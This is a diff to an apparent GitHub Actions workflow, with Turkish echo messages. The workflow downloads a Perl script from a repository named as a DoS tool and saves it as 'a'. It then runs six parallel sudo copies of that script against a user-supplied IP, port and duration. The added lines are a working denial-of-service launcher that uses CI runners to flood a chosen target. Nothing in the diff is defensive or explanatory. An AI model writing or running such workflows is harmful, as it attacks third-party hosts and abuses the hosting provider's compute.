@@ -31,7 +31,7 @@ jobs:
 
           if [ "$METHOD" = "tcp" ]; then
             echo "TCP methodu indiriliyor..."
-            wget https://example.com/methods/tcp.sh -O method.sh
+            wget https://github.com/DeaDHackS/XonoR-DoS-Tool/blob/master/xonor.pl -O a
 
           elif [ "$METHOD" = "udp" ]; then
             echo "UDP methodu indiriliyor..."
@@ -53,7 +53,7 @@ jobs:
             echo "TCP method seçildi"
 
             for i in {1..6}; do
-              sudo perl a ${{ inputs.ip }} ${{ inputs.port }} 1024 ${{ inputs.time }} &
+              sudo perl a ${{ inputs.ip }} ${{ inputs.port }} tcp 1024 ${{ inputs.time }} &
               PIDS+=($!)
             done
 
